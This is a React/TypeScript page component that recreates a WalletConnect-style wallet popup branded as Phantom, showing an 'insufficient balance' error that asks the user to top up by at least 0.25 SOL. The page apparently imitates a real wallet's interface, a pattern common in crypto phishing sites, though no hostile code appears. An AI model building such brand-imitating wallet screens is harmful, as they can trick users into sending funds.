// src/pages/InsufficientBalance.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react/no-unknown-property */

import React from "react";
import "../styles/main.css";
import "../index.css";

declare global {
  namespace JSX {
    interface IntrinsicElements {
      "w3m-modal": any;
      "w3m-header": any;
      "w3m-router": any;
      "w3m-bad-wallet": any;
      "w3m-wallet-view-base": any;
      "w3m-snackbar": any;
      "w3m-alertbar": any;
      "wui-flex": any;
      "wui-text": any;
      "wui-icon-box": any;
      "wui-icon": any;
      "wui-button": any;
    }
  }
}

export default function InsufficientBalancePage() {
  return (
    <main
      className="insufficient-balance-page"
      style={{
        height: "100vh",             // tam ekran
        display: "flex",
        flexDirection: "column",
      }}
    >
      <w3m-modal
        className="embedded open"
        style={
          {
            "--w3m-modal-width": "430px",
            flex: 1,                 // boşluğu kapla
            display: "flex",
            flexDirection: "column",
          } as React.CSSProperties
        }
      >
        {/* HEADER -------------------------------------------------------- */}
        <w3m-header className="embedded" style={{ padding: 0, margin: 0 }}>
          <wui-flex
            style={{
              alignItems: "center",
              justifyContent: "center",
              padding: "2px var(--wui-spacing-2l)",
            }}
          >
            <wui-text
              color="fg-100"
              variant="large-600"
              style={
                {
                  "--local-align": "center",
                  "--local-color": "var(--wui-color-fg-100)",
                  fontWeight: 600,
                  fontSize: "20px",
                  marginTop: "15px",
                } as React.CSSProperties
              }
            >
              Phantom
            </wui-text>
          </wui-flex>
          <hr
            style={{
              margin: 0,
              marginTop: "7px",
              border: "none",
              borderBottom: "0.5px solid rgba(255,255,255,0.08)",
            }}
          />
        </w3m-header>

        {/* CONTENT ------------------------------------------------------- */}
        <w3m-router
          className="embedded"
          style={
            {
              animation: "unset",
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            } as React.CSSProperties
          }
        >
          <div
            className="w3m-router-container"
            style={
              {
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "center",
                gap: "var(--wui-spacing-xl)",
                padding: "var(--wui-spacing-m) var(--wui-spacing-xl)",
                width: "100%",
              } as React.CSSProperties
            }
          >
            <w3m-bad-wallet>
              <w3m-wallet-view-base className="embedded">
                <wui-flex
                  flexdirection="column"
                  alignitems="center"
                  justifycontent="center"
                  gap="xl"
                  data-error="true"
                  style={
                    {
                      flexDirection: "column",
                      alignItems: "center",
                      justifyContent: "center",
                      gap: "var(--wui-spacing-xl)",
                    } as React.CSSProperties
                  }
                >
{/* Wallet image + close icon -------------------------- */}
<div
  style={{
    position: "relative",
    // Biraz daha büyük logo için wrapper boyutunu artırdık
    width: "calc(var(--wui-wallet-image-size-lg) + var(--wui-spacing-m))",
    height: "calc(var(--wui-wallet-image-size-lg) + var(--wui-spacing-m))",
    marginBottom: "var(--wui-spacing-m)",
  }}
>
  {/* Phantom logosu */}
  <div
    style={{
      width: "100%",
      height: "100%",
      borderRadius: "var(--wui-border-radius-m)",
      background: "#AB9FF2",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      overflow: "hidden",
    }}
  >
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="100%"
      height="100%"
      viewBox="0 0 128 128"
      role="img"
      aria-label="Phantom logo"
    >
      <path fill="#AB9FF2" d="M0 0h128v128H0z" />
      <path
        fill="#FFFDF8"
        fillRule="evenodd"
        clipRule="evenodd"
        d="M55.6 82.1C51 89.5 43 98.7 32.3 98.7c-5 0-9.9-2-9.9-11 0-23 31.2-58.4 60.2-58.4 16.5 0 23.1 11.5 23.1 24.5 0 16.6-10.8 35.7-21.6 35.7-3.4 0-5-1.9-5-4.8 0-.8 0-1.6.3-2.6-3.7 6.3-10.7 12.1-17.4 12.1-4.8 0-7.3-3-7.3-7.3 0-1.5.4-3.1 1-4.8Zm25-28.8c0 3.8-2.2 5.7-4.7 5.7-2.6 0-4.8-1.9-4.8-5.7 0-3.8 2.2-5.7 4.8-5.7 2.5 0 4.7 2 4.7 5.7Zm14.2 0c0 3.8-2.2 5.7-4.7 5.7-2.6 0-4.8-1.9-4.8-5.7 0-3.8 2.2-5.7 4.8-5.7 2.5 0 4.7 2 4.7 5.7Z"
      />
    </svg>
  </div>

  {/* Close ikonu – koyu daire + kırmızı çarpı */}
  <div
    style={{
      position: "absolute",
      bottom: "-4px",
      right: "-4px",
      width: "calc(var(--wui-icon-box-size-sm) + 2.5px)",
      height: "calc(var(--wui-icon-box-size-sm) + 2.5px)",
      borderRadius: "50%",
      background: "#3c2426",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      border: "2px solid var(--wui-color-bg-125)",
    }}
  >
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 16 16"
      style={{
        width: "14px",
        height: "14px",
        flexShrink: 0,
      }}
    >
      <path
        fill="#f25a68"
        fillRule="evenodd"
        clipRule="evenodd"
        d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
      />
    </svg>
  </div>
</div>

                  {/* TEXTS ------------------------------------------------ */}
                  <wui-flex
                    flexdirection="column"
                    alignitems="center"
                    gap="xs"
                    style={{
                      flexDirection: "column",
                      alignItems: "center",
                      gap: "var(--wui-spacing-xs)",
                    }}
                  >
<wui-text
  variant="paragraph-500"
  style={{
    "--local-align": "center",
    color: "var(--wui-color-error-110)",
    fontWeight: 650
  } as React.CSSProperties}
>
  You have an insufficient balance
</wui-text>
<wui-text
  variant="small-500"
  style={{
    "--local-align": "center",
    "--local-color": "#949e9e",
    color: "#949e9e",
    fontSize: "14px",
    fontWeight: 600,    // Biraz daha kalın
  } as React.CSSProperties}
>
  Top-up your balance by at least 0.25&nbsp;SOL
</wui-text>
                  </wui-flex>

{/* BUTTONS -------------------------------------------- */}
<wui-flex
  style={{
    justifyContent: "center",
    gap: "var(--wui-spacing-xs)",   // Çok sıkı boşluk
    marginTop: "var(--wui-spacing-xs)",
  }}
>
  {/* TRY AGAIN */}
  <wui-button
    size="md"
    variant="inverse"
    style={
      {
              margin: 0,        // Fazladan boşluğu sil
              padding: 0,
        "--local-width": "auto",
        "--local-border-radius": "var(--wui-border-radius-m)",
      } as React.CSSProperties
    }
  >
    <button
      data-variant="inverse"
      data-icon-left="true"
      data-size="md"
    >
      <wui-icon
        name="refresh"
        slot="iconLeft"
        style={
          {
            "--local-color": "var(--wui-color-inherit)",
            "--local-width": "var(--wui-icon-size-md)",
          } as React.CSSProperties
        }
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="14"
          height="16"
          viewBox="0 0 14 16"
        >
          <path
            fill="currentColor"
            fillRule="evenodd"
            clipRule="evenodd"
            d="M3.94 1.04a1 1 0 0 1 .7 1.23l-.48 1.68a5.85 5.85 0 0 1 8.53 4.32 5.86 5.86 0 0 1-11.4 2.56 1 1 0 0 1 1.9-.57 3.86 3.86 0 1 0 1.83-4.5l1.87.53a1 1 0 0 1-.55 1.92l-4.1-1.15a1 1 0 0 1-.69-1.23l1.16-4.1a1 1 0 0 1 1.23-.7Z"
          />
        </svg>
      </wui-icon>
      <wui-text variant="small-600">Try again</wui-text>
    </button>
  </wui-button>

  {/* BUY CRYPTO */}
  <wui-button
    size="md"
    variant="main"
    style={
      {
          margin: 0,        // Fazladan boşluğu sil
          padding: 0,
        "--local-width": "auto",
        "--local-border-radius": "var(--wui-border-radius-m)",
      } as React.CSSProperties
    }
  >
    <button
      data-variant="main"
      data-icon-left="true"
      data-size="md"
    >
      <wui-icon
        name="card"
        slot="iconLeft"
        style={
          {
            "--local-color": "var(--wui-color-inherit)",
            "--local-width": "var(--wui-icon-size-md)",
          } as React.CSSProperties
        }
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="12"
          height="13"
          viewBox="0 0 12 13"
        >
          <path
            fill="currentColor"
            fillRule="evenodd"
            clipRule="evenodd"
            d="M4.16 2h3.68c.53 0 .98 0 1.36.04.39.04.78.14 1.12.39.2.14.36.3.5.5.25.34.35.73.4 1.12.03.38.03.83.03 1.36V7.6c0 .53 0 .98-.04 1.36-.04.4-.14.78-.39 1.12a2.25 2.25 0 0 1-.5.5c-.34.25-.73.35-1.12.4-.37.03-.83.03-1.36.03H4.16c-.53 0-.99 0-1.36-.04-.4-.04-.78-.14-1.12-.39a2.25 2.25 0 0 1-.5-.5 2.28 2.28 0 0 1-.39-1.12C.75 8.57.75 8.12.75 7.59V5.4c0-.53 0-.98.04-1.36.04-.39.14-.78.39-1.12a2.25 2.25 0 0 1 .5-.5c.35-.25.73-.35 1.13-.39C3.17 2 3.63 2 4.16 2Zm-1.2 1.53c-.26.03-.35.08-.4.11a.75.75 0 0 0-.17.17c-.03.05-.08.14-.1.4a5.8 5.8 0 0 0-.04.5h7.5a5.8 5.8 0 0 0-.03-.5c-.03-.26-.08-.35-.11-.4a.75.75 0 0 0-.17-.17c-.05-.03-.14-.08-.4-.1-.29-.04-.66-.04-1.24-.04H4.2c-.58 0-.95 0-1.23.03Zm6.79 2.68h-7.5v1.34c0 .58 0 .95.03 1.23.03.27.08.36.11.41a.75.75 0 0 0 .17.17c.05.03.14.08.4.1.29.04.66.04 1.24.04h3.6c.58 0 .95 0 1.23-.03.27-.03.36-.08.41-.11a.75.75 0 0 0 .17-.17c.03-.05.08-.14.1-.4.04-.29.04-.66.04-1.24Z"
          />
        </svg>
      </wui-icon>
      <wui-text variant="small-600">Buy crypto</wui-text>
    </button>
  </wui-button>
</wui-flex>


                </wui-flex>
              </w3m-wallet-view-base>
            </w3m-bad-wallet>
          </div>
        </w3m-router>

        {/* PLACEHOLDERS -------------------------------------------------- */}
        <w3m-snackbar />
        <w3m-alertbar />
      </w3m-modal>
    </main>
  );
}
